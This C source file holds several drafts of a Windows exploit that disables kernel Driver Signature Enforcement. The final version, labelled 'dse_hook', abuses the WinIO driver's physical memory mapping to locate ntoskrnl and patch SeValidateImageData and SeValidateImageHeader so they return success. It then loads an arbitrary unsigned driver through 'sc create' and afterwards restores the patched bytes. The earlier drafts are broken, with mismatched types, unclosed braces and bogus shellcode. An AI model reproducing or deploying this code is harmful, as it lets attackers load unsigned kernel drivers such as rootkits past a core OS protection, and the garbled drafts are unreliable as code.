/*#include <windows.h>
#include <winternl.h>

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    HKEY hKey;
    DWORD dwType, dwSize = sizeof(DWORD);
    DWORD dwData;

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_QUERY_VALUE, &hKey);
    RegQueryValueExA(hKey, "DisablePagingExecutive", NULL, &dwType, (LPBYTE)&dwData, &dwSize);
    RegCloseKey(hKey);

    SYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength;

    NtQuerySystemInformation(11, &smi, sizeof(smi), &returnLength);
    PVOID ntoskrnlBase = smi.Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x48, 0x8B, 0x10, 
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00, 
        0x48, 0x89, 0x10 
    };

    BYTE pattern[] = { 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC1, 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC0, 0xF6, 0xC1, 0x01 };

    for (DWORD i = 0; i < smi.Module[0].ImageSize - sizeof(pattern); i++) {
        if (memcmp((PVOID)((ULONG_PTR)ntoskrnlBase + i), pattern, sizeof(pattern)) == 0) {
            memcpy(&shellcode[2], (PVOID)((ULONG_PTR)ntoskrnlBase + i), sizeof(PVOID));
            break;
        }
    }

    LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}*/

/////////////////////

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define SystemModuleInformation 11

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    LPVOID RegSetValueExAAddr = GetProcAddress(hAdvapi32, "RegSetValueExA");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!LoadLibraryAAddr || !GetProcAddressAddr || !RegOpenKeyExAAddr || !RegQueryValueExAAddr || !RegCloseKeyAddr || !RegSetValueExAAddr || !NtQuerySystemInformation) {
        printf("Failed to get function addresses\n");
        return -1;
    }

    HKEY hKey;
    DWORD dwData = 1;
    DWORD dwSize = sizeof(DWORD);

    if (((BOOL(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY))RegOpenKeyExAAddr)(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        printf("Failed to open registry key\n");
        return -1;
    }

    if (((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))RegSetValueExAAddr)(hKey, "DisablePagingExecutive", 0, REG_DWORD, (const BYTE*)&dwData, dwSize) != ERROR_SUCCESS) {
        printf("Failed to set registry value\n");
        ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);
        return -1;
    }

    ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);

    SYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength = 0;

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, &smi, sizeof(smi), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed\n");
        return -1;
    }

    PVOID ntoskrnlBase = smi.Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x8B, 0x10,
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00,
        0x48, 0x89, 0x10,
        // Disable DSE
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,
        // Return address
        0xC3,
};

LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!shellcodeAddr) {
    printf("VirtualAlloc failed\n");
    return -1;
}
memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
if (!hThread) {
    printf("CreateThread failed\n");
    return -1;
}

WaitForSingleObject(hThread, INFINITE);

// Find the ntoskrnl.exe image
PSYSTEM_MODULE_INFORMATION smi;
ULONG returnLength = 0;
NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, &smi, sizeof(smi), &returnLength);
if (!NT_SUCCESS(status)) {
    printf("NtQuerySystemInformation failed\n");
    return -1;

PVOID ntoskrnlBase = smi.Module[0].ImageBase;

// Patch ntoskrnl.exe
DWORD* disableDSE = (DWORD*)((ULONG_PTR)ntoskrnlBase + MmPagingFoundation];
disableDSE[1] = 1; // Disable DSE

// Commit changes
FlushInstructionCache(GetCurrentProcess(), (PVOID)disableDSE,sizeof(DWORD));
}

return 0;
}

/////


============
last version 
============


#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define SystemModuleInformation 11
#define MmPagingFoundation 0x13B0

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    LPVOID RegSetValueExAAddr = GetProcAddress(hAdvapi32, "RegSetValueExA");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!LoadLibraryAAddr || !GetProcAddressAddr || !RegOpenKeyExAAddr || !RegQueryValueExAAddr || !RegCloseKeyAddr || !RegSetValueExAAddr || !NtQuerySystemInformation) {
        printf("Failed to get function addresses\n");
        return -1;
    }

    HKEY hKey;
    DWORD dwData = 1;
    DWORD dwSize = sizeof(DWORD);

    if (((BOOL(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY))RegOpenKeyExAAddr)(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        printf("Failed to open registry key\n");
        return -1;
    }

    if (((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))RegSetValueExAAddr)(hKey, "DisablePagingExecutive", 0, REG_DWORD, (const BYTE*)&dwData, dwSize) != ERROR_SUCCESS) {
        printf("Failed to set registry value\n");
        ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);
        return -1;
    }

    ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);

    PSYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength;

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation , &smi,sizeof(SYSTEM_MODULE_INFORMATION), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed\n");
        return -1;
    }

    PVOID ntoskrnlBase = smi->Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x8B, 0x10,
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00,
        0x48, 0x89, 0x10,
        // Disable DSE
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,
        // Return address
        0xC3,
};

LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!shellcodeAddr) {
    printf("VirtualAlloc failed\n");
    return -1;
}
memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
if (!hThread) {
    printf("CreateThread failed\n");
    return -1;
}

WaitForSingleObject(hThread, INFINITE);

// Find the ntoskrnl.exe image
NTSTATUS systemStatus = NtQuerySystemInformation(SystemModuleInformation , (PVOID)&smi,sizeof(SYSTEM_MODULE_INFORMATION), &returnLength);
if (!NT_SUCCESS(systemStatus)) {
printf("NtQuerySystemInformation failed\n");
return -1;

PVOID ntoskrnlBase = smi->Module[0].ImageBase;

// Patch ntoskrnl.exe
DWORD* disableDSE = (DWORD*)((ULONG_PTR)ntoskrnlBase + MmPagingFoundation);
disableDSE[1] = 1; // Disable DSE

// Commit changes
FlushInstructionCache(GetCurrentProcess(), (PVOID)disableDSE,sizeof(DWORD));
HeapFree(GetProcessHeap(), 0, smi);
}

return 0;
}



/////////////////////
// hotest version //
////////////////////

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef unsigned long u32;
typedef unsigned long long u64;

#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define PATTERN_SEARCH_RANGE 0xBFFFFF
#define DRIVER_NAME_LEN 16

char se_validate_image_data_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };
char se_validate_image_header_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };

unsigned char se_validate_image_data_pattern[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };
unsigned char se_validate_image_header_pattern[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };

char patch[6] = {
    0xB8, 0x00, 0x00, 0x00, 0x00,    // mov rax, 0
    0xC3                // ret
};

u64 driver_handle = -1;
char winio_path[FILENAME_MAX];

struct winio_packet
{
    u64 size;
    u64 phys_address;
    u64 phys_handle;
    u64 phys_linear;
    u64 phys_section;
};

u64 phys_map(winio_packet* packet)
{
    u32 bytes_returned;
    if (!DeviceIoControl((void*)driver_handle, IOCTL_MAP, packet, sizeof(winio_packet), packet, sizeof(winio_packet), &bytes_returned, NULL))
        return NULL;

    return packet->phys_linear;
}

bool phys_unmap(winio_packet* packet)
{
    u32 bytes_returned;
    if (!DeviceIoControl((void*)driver_handle, IOCTL_UNMAP, packet, sizeof(winio_packet), NULL, 0, &bytes_returned, NULL))
        return false;

    return true;
}

bool read_phys(u64 addr, u64 buf, u64 size)
{
    winio_packet packet;
    packet.phys_address = addr;
    packet.size = size;

    u64 linear_address = phys_map(&packet);
    if (linear_address == NULL)
        return false;

    if (IsBadReadPtr((void*)linear_address, 1))
        return false;

    printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
    memcpy((void*)buf, (void*)linear_address, size);

    phys_unmap(&packet);
    return true;
}


bool write_phys(u64 addr, u64 buf, u64 size)
{
    winio_packet packet;
    packet.phys_address = addr;
    packet.size = size;

    u64 linear_address = phys_map(&packet);
    if (linear_address == NULL)
        return false;

    if (IsBadReadPtr((void*)linear_address, 1))
        return false;

    printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
    memcpy((void*)linear_address, (void*)buf, size);

    phys_unmap(&packet);
    return true;
}

u64 find_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_length)
{
    u64 buf = (u64)malloc(range);
    read_phys(start, (u64)buf, range);

    u64 result = 0;
    for (int i = 0; i < range; i++)
    {
        bool vtn = true;
        for (int j = 0; j < pattern_length; j++)
        {
            if (vtn && pattern[j] != 0x00 && *(unsigned char*)(buf + i + j) != pattern[j])
            {
                vtn = false;
            }
        }

        if (vtn)
        {
            result = start + i;
            goto ret;
        }
    }

ret:
    free((void*)buf);
    return result;
}

bool file_exists(const char* path) {
    DWORD v0 = GetFileAttributesA(path);
    return v0 != -1 && !(v0 & 0x00000010);
}

void load_driver_lazy(const char* driver_name, const char* bin_path)
{
    u64 cmdline_create_buf = (u64)malloc(strlen(driver_name) + strlen(bin_path) + 53);
    u64 cmdline_start_buf = (u64)malloc(strlen(driver_name) + 14);
    sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", driver_name, bin_path);
    sprintf((char*)cmdline_start_buf, "sc start %s>NUL", driver_name);
    system((char*)cmdline_create_buf);
    system((char*)cmdline_start_buf);
}

int main(int argc, char* argv[])
{
    printf("[*] dse_hook by emlinhax\n");

    if (argc != 3 || (strlen(argv[1]) < 2 || strlen(argv[2]) < 2))
    {
        printf("[!] usage: dse_hook.exe your_driver_name c:\\your_driver.sys\n");
        Sleep(1000);
        return -1;
    }

    if (!file_exists(argv[2]))
    {
        printf("[!] could not find your driver.");
        system("pause>NUL");
        return -2;
    }

    while (1) {
        LOAD_WINIO:
        printf("[*] attempting to open handle to winio...\n");
        driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (driver_handle == -1)
        {
            GetCurrentDirectoryA(FILENAME_MAX, winio_path);
            strcat(winio_path, "\\WinIO64.sys");

            if (!file_exists(winio_path))
            {
                printf("[!] could not find winio driver.\n[!] please make sure \"WinIO64.sys\" is in the same folder.\n");
                system("pause>NUL");
                return -3;
            }

            //winio driver doesnt unload correctly sometimes. you have to stop it multiple times (?)
            system("sc stop winio_dse_hook >NUL");
            system("sc delete winio_dse_hook >NUL");

            load_driver_lazy("winio_dse_hook", winio_path);
            continue;
        }

        printf("[*] driver_handle: %p\n", driver_handle);

        // ####

        printf("[*] finding ntoskrnl...\n");
        u64 ntos_base_pa = 0;
        for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000)
        {
            char* buf = (char*)malloc(2);
            read_phys(i, (u64)buf, 2);

            if (buf[0] == 'M' && buf[1] == 'Z')
            {
                ntos_base_pa = i;
                printf("[*] ntoskrnl @ 0x%p\n", ntos_base_pa);
                break;
            }

            free(buf);
        }

        if (!ntos_base_pa)
        {
            printf("[!] could not find ntoskrnl base.\n");
            system("pause>NUL");
            return -5;
        }

        // find target physical addresses for patch
        u64 se_validate_image_data_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_data_pattern, sizeof(se_validate_image_data_pattern));
        u64 se_validate_image_header_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_header_pattern, sizeof(se_validate_image_header_pattern));
        if (se_validate_image_data_pa == 0 || se_validate_image_header_pa == 0)
        {
            printf("[!] could not find one or both patterns.\n");
            system("pause>NUL");
            return -6;
        }

        // save original bytes
        read_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
        read_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));

        // patch both routines to return zero
        write_phys(se_validate_image_data_pa, (u64)&patch, sizeof(patch));
        write_phys(se_validate_image_header_pa, (u64)&patch, sizeof(patch));
        printf("[*] patched validation routines.\n");

        // start the target driver
        load_driver_lazy(argv[1], argv[2]);
        printf("[*] loaded driver!\n");

        // unpatch both functions
        write_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
        write_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));
        printf("[*] restored validation routines.\n");

        // unload winio driver
        system("sc stop winio_dse_hook >NUL");
        system("sc delete winio_dse_hook >NUL");
        printf("[*] unloaded winio driver.\n");

        printf("[*] done!\n");
        //system("pause");
        Sleep(1000);

        break; // Exit the loop after completing the process
    }

    return 0;
}
